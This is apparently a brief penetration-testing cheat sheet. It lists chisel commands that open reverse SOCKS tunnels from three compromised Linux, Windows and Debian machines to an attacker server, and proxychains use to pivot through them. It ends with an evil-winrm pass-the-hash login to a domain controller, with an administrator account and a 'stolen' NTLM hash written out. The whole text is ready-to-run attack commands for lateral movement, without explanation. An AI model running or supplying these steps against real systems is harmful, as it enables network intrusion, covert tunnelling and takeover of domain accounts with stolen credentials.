## Attacker Server
./chisel_1.9.1_linux_amd64 server -p 8001 --reverse -v --keepalive 5s --socks5 25000

## Machine 1 (Linux)
chisel client 192.168.1.72 8001 --reverse R:socks:2000
vi /etc/proxychains4.conf # Change socks and port to match socks port.

## Machine 2 (Windows)
chisel client 192.168.1.72 8001 --reverse R:socks:2001

## Machine 3 (Debian)
chisel client 192.168.1.72 8001 --reverse R:socks:2002

## Attacker Machine
proxychains ssh

## Attacker Remote Connection to DC01 with stolen NTLM hash
proxychains evil-winrm -i 10.10.83.152 -u administrator -H 59b280ba707d22e3ef0aa587fc29ffe5
